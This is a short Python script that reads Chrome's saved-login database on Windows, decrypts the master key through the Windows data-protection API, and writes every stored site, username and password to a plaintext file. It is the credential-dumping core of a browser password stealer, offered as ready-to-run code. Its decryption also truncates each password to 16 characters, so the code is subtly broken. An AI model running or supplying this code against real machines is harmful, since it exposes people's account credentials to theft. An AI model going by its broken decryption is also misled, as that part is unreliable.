import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Cryptodome.Cipher import AES


def get_local_state() -> str:
    return os.environ['USERPROFILE'] + r'\AppData\Local\Google\Chrome\User Data\Local State'


def get_login_data() -> str:
    return os.environ['USERPROFILE'] + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"


def get_key(local_state: str):
    with open(local_state, 'r') as ls:
        data = json.loads(ls.read())
        encrypted_key = base64.b64decode(data['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key)[1]


def decode_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        return AES.new(key, AES.MODE_GCM, iv).decrypt(password)[:16].decode()
    except:
        return 'No Password'


def export_data_from_database(db_path, save_to):
    shutil.copyfile(db_path, './data.db')
    db = sqlite3.connect('./data.db')
    cursor = db.cursor()
    cursor.execute('select origin_url, action_url, username_value, password_value from logins order by date_last_used')
    with open(save_to, 'w', encoding='utf-8') as data_file:
        for site, url, username, password in cursor.fetchall():
            data_file.write('-' * 10 + site + '-' * 10 + '\n')
            data_file.write('url: ' + url + '\n')
            data_file.write('username: ' + username + '\n')
            data_file.write('password: ' + decode_password(password, get_key(get_local_state())) + '\n')
            data_file.write('-' * len('-' * 10 + site + '-' * 10) + '\n\n')
    cursor.close()
    db.close()
    os.remove('./data.db')


def export_passwords(path):
    export_data_from_database(get_login_data(), path)


if __name__ == '__main__':
    export_passwords('./passwords.txt')
